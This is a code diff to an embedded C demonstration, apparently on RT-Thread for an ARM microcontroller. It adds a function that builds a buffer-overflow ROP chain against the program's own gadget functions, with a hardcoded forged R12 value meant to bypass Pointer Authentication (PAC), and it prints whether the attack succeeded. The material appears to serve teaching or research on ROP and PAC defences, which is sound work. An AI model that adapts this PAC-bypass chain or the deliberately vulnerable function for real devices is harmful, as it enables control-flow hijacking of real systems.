@@ -130,9 +130,9 @@ static void gadget_exit(void)
     while (1)
     {
         rt_pin_write(LED_PIN, PIN_HIGH);
-        rt_thread_mdelay(50);
+        rt_thread_mdelay(100);
         rt_pin_write(LED_PIN, PIN_LOW);
-        rt_thread_mdelay(50);
+        rt_thread_mdelay(100);
     }
 }
 
@@ -268,6 +268,79 @@ static void demo_rop_attack(void)
     rt_kprintf("\n");
 }
 
+
+/**
+ * @brief Demonstrate ROP attack with PAC protection - test 1
+ */
+static void demo_rop_attack_with_pac_1(void)
+{
+    rt_kprintf("\n=== DEMO 3: ROP Attack (with PAC - Fake R12) ===\n");
+    rt_kprintf("[ATTACK] Preparing ROP chain...\n");
+    
+    char malicious_input[64];
+    int offset = 16;  // 16 (buffer)
+    
+    memset(malicious_input, 0, sizeof(malicious_input));
+    memset(malicious_input, 'A', offset);
+	
+	  // Fake R12 to bypass AUT
+	  uint32_t value = 0x741e09d4;
+	  memcpy(malicious_input + offset, &value, sizeof(value));
+    offset += sizeof(value);
+	
+	  // Fulfill r4-r6
+	  memset(malicious_input + offset, 'A', 12);
+	  offset += 12;
+	
+    // Get gadget addresses and ensure Thumb bit is set
+    uint32_t addr1 = (uint32_t)gadget_set_flag | 0x1;
+    uint32_t addr2 = (uint32_t)gadget_leak_secret | 0x1;
+    uint32_t addr3 = (uint32_t)gadget_dangerous_op | 0x1;
+    uint32_t addr4 = (uint32_t)gadget_exit | 0x1;
+    
+    rt_kprintf("\n[ATTACK] ROP Chain:\n");
+    rt_kprintf("  [0] gadget_set_flag:     0x%08X\n", addr1);
+    rt_kprintf("  [1] gadget_leak_secret:  0x%08X\n", addr2);
+    rt_kprintf("  [2] gadget_dangerous_op: 0x%08X\n", addr3);
+    rt_kprintf("  [3] gadget_exit:         0x%08X\n", addr4);
+    
+    // Build ROP chain
+    uint32_t *rop_chain = (uint32_t *)(malicious_input + offset);
+    rop_chain[0] = addr1;  // Overwrite pc with gadget_set_flag
+    rop_chain[1] = addr2;  // gadget_set_flag will POP this to pc
+    rop_chain[2] = addr3;  // gadget_leak_secret will POP this to pc
+    rop_chain[3] = addr4;  // gadget_dangerous_op will POP this to pc
+    
+    rt_kprintf("\n[ATTACK] Payload structure:\n");
+    rt_kprintf("  Bytes [00-15]: Buffer (16 bytes)\n");
+    rt_kprintf("  Bytes [16-19]: Overwrite r12\n");
+    rt_kprintf("  Bytes [20-23]: Overwrite r4\n");
+    rt_kprintf("  Bytes [24-27]: Overwrite r5\n");
+		rt_kprintf("  Bytes [28-31]: Overwrite r6\n");
+    rt_kprintf("  Bytes [32-35]: Overwrite pc with gadget_set_flag\n");
+    rt_kprintf("  Bytes [36-39]: gadget_leak_secret\n");
+    rt_kprintf("  Bytes [40-43]: gadget_dangerous_op\n");
+    rt_kprintf("  Bytes [44-47]: gadget_exit\n");
+    
+    rt_kprintf("\n[ATTACK] Launching attack...\n");
+    rt_kprintf("================================================\n");
+    
+    g_privileged_flag = 0;
+    
+    vulnerable_function(malicious_input, 48);
+    
+    rt_kprintf("================================================\n");
+    rt_kprintf("[RESULT] Privileged flag: 0x%08X ", g_privileged_flag);
+    if (g_privileged_flag == 0xDEADBEEF) {
+        rt_kprintf("(ATTACK SUCCESS!)\n");
+        rt_kprintf("[RESULT] ROP chain executed - unauthorized operations performed!\n");
+    } else {
+        rt_kprintf("(Protected)\n");
+        rt_kprintf("[RESULT] Attack was prevented\n");
+    }
+    rt_kprintf("\n");
+}
+
 /**
  * @brief Demonstrate how PAC would defend against ROP
  * 
@@ -275,7 +348,7 @@ static void demo_rop_attack(void)
  */
 static void demo_pac_defense(void)
 {
-    rt_kprintf("\n=== DEMO 3: PAC Defense Against ROP ===\n");
+    rt_kprintf("\n=== DEMO 4: PAC Defense Against ROP ===\n");
     rt_kprintf("[INFO] PAC (Pointer Authentication Code) defense:\n");
     rt_kprintf("  1. Function entry: LR is signed with PACIASP\n");
     rt_kprintf("  2. Function exit:  LR is authenticated with AUTIASP\n");
@@ -329,7 +402,8 @@ void hal_entry(void)
     // analyze_stack_layout();
     
     demo_normal_execution();    // Show normal behavior
-    demo_rop_attack();          // Demonstrate ROP attack
+    //demo_rop_attack();          // Demonstrate ROP attack
+	  demo_rop_attack_with_pac_1();
     demo_pac_defense();         // Explain PAC defense
     
     rt_kprintf("\n[INFO] Demonstration complete. LED will blink.\n");
